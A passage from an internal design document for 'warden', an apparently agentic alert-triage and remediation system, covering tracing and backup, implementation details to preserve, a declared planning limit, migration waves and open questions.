- **Cost per item.** Baseline: total real-money LLM spend across the estate is
  $82 / 14 days; the agentic path runs on the flat Max subscription. **Cost is not
  a constraint on this design** — route for quality.
- **Uptime Kuma push**, joining the existing composite heartbeat.
- **One trace per item, one span per stage**, emitted to HyperDX. It already
  ingests OTel and `/otel` already queries it, so this is a client, not a stack.
  The number that matters is **duration split by stage**: a median time-to-fix is
  useless if it hides that 90% of it was waiting on a human — which is the number
  this design exists to move.
- **Episode transcripts linked from the item.** "What did the agent actually do"
  must not require finding a worktree by UUID.
- **Backup** rides the existing homelab restic → B2 path rather than inventing
  one: the `VACUUM INTO` snapshot ships mini → homelab over the tailnet into a
  directory restic already covers. Open: restic runs *on* homelab and the mini is
  not currently in its source set — verify the paths before assuming coverage.

---

## What must not be lost

Details in the current implementation that read like accidents and are not.

1. **`card_hash` short-circuit** — stops the channel becoming a firehose, *and*
   is currently the only thing hiding the grouped-reopen churn bug. **Fix the
   reopen condition first** — reopen on a new occurrence, not on
   `resolved_at IS NULL` — before relying on re-render.
2. **Dissolve deliberately leaves `dispatch_job` set** as a cooldown anchor.
   Clearing it lets `escalate()` re-fuse the pair in the same run.
3. **Two match targets per event** — `source:external_id` *and*
   `source:normalize_title(title)`. Without the second, every `uk:*` rule is
   unmappable: UptimeKuma's `external_id` is an opaque id that changes on recreate.
4. **Grouped vs. state sources are two mechanisms.** Grouped never
   disappearance-resolve; the idle anchor is
   `last_reminder_at || notified_at || first_seen`, needing no new column.
   Recovery-pairing is the strong path, the 2h timer the fallback, and neither
   ever claims a fix.
5. **`note` vs `ignored`.** `ignored` is invisible; `note` is uncarded but in the
   daily digest. The split exists because the DB contains a human message naming
   a root cause and its two-line fix, never shipped.
6. **The five closed allowlists.** One principle, five instances (a fifth,
   `HOST_VERB_ALLOWLIST`, added 2026-09-11 — § The host-verb carve-out). v1
   broke the fourth; don't break the others while generalizing.
7. **Overflow waits, never drops** — cluster members past 5 stay `new`.
8. **The dry-run contract** — never touches Slack, never shells out, everything
   else real. With no staging environment this is the only pre-production surface
   that exists.
9. **`_strip_op_refs_timestamps()`** applies to one fallback path only.
   `normalize_title()` is unchanged because six sources depend on its behaviour.

---

## Known limit: the planning problem

Warden executes independently-decidable, single-repo steps. A verdict can be
correct and not fit that: *"fix the server first, deploy it, then the client; if
the server probe fails, stop."* There is no representation for an ordered
cross-repo plan, for shared evidence between two items, or for revising a plan
when the first deploy disproves the diagnosis. The cluster-feedback open question
is evidence of this boundary, not a parser gap.

For the first release this is **declared unsupported**: such a verdict routes to
`needs_human` under case 3. That is honest, and it means the human-essential list
has a de-facto fifth entry — *the plan does not fit the executor* — which should
be named rather than discovered.

---

## Migration

Wave 0 is **not** a `git mv`, which v1 got wrong. `~/.hermes/{scripts,config}` are
whole-directory symlinks shared with ~10 hermes-agent-only scripts;
`agents-overview.py` (staying) depends on `hermes-cc.sh` (leaving);
`watchdog.db` is not in git at all and needs a stop-copy-verify migration;
`watchdog-slack.py` and `dispatch-sweep-cron.py` become orphaned; the Ed25519
verifier needs `cryptography` from a venv that does not exist yet;
`test_dispatch_approval.py` straddles both repos. **2–3 days.**

| Wave | What |
|-|-|
| **0** | Extract. Re-assert the repo allowlist **inside sideclaw**. Typed `outcome` enum + versioned verdict schema. WAL, one writer, one migrator, `schema_version`, backup. Promote the two cron jobs to LaunchAgents; delete the orphan wrappers. |
| **1** | Intent/signature split. Slack repointed. ~~CLI decide path~~ (withdrawn — see § The decision primitive). Deadlines and `state_deadline` on every chain state. Fix the quiet rule. |
| **2** | Honest states + `dismissed` (cheap — the enum value already exists unconsumed). `/metrics`. Fix the reopen condition before any re-render work. |
| **3** | Abort, revert, per-repo lock, crash reconciliation with `unknown`. Prove one complete path survives a kill at every boundary. |
| **4** | Argo console. |
| **5+** | New origins (`github_issue`, `github_pr`, `human`), deploy keys beyond the seeded one, `review` tier. |

The reordering is deliberate and follows the out-of-family review: **prove one
complete path — actionable verdict → recorded disposition → authorized operation
→ reconciled deployment → positive verification, with an explicit failure outcome
— and kill the process at every boundary to show it neither drops the obligation
nor repeats an unsafe action.** Additional origins and surfaces before that only
feed and display the same hole.

---

## Open questions

1. **Does warden keep Python?** Recommendation: yes, including the read-only API.
2. **`hermes-cc.sh` splits four ways** (above) — who owns the GitHub module, and
   does `agents-overview.py` get a compat path or its own client?
3. **`stray_skill` 849** — an agent-created skill, 86 patches, outside
   `skills.external_dirs`, flagged 8 days, and **no `triage_items` row exists for
   it at all**. Warden origin or hermes concern?
4. **Cluster feedback** — an inverse of `UNRELATED SIGNATURES`, or over-fitting?
   See *Known limit*.

Resolved since v1: `uk:95` / `uk:179` / `uk:186` are UptimeKuma **group** monitors
matching `homelab/uptime-kuma/monitors.yaml` group names verbatim — mappable
without guessing. Note `uk:186` ("Local") is the parent whose child message is the
unmapped `slack_alert` in the brain-sync triple-failure: a known bug, not a naming
question.
